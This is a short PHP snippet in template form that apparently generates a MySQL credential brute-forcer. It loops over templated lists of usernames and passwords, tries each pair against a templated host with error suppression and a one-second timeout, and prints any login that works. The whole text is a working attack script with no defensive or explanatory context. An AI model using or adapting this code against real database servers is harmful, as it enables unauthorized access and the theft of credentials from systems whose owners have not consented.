ini_set('mysql.connect_timeout',1);
$users=array (
    % for u in users:
    '${ u }',
    % endfor
);
$pwds=array (
    % for p in pwds:
    '${ p }',
    % endfor
);

foreach($users as $u) {
    foreach($pwds as $p) {
        $c=@mysql_connect("${ hostname }", "$u", "$p");
        if($c){
            print("$u:$p".PHP_EOL);
            break;
        }
    }
}mysql_close();
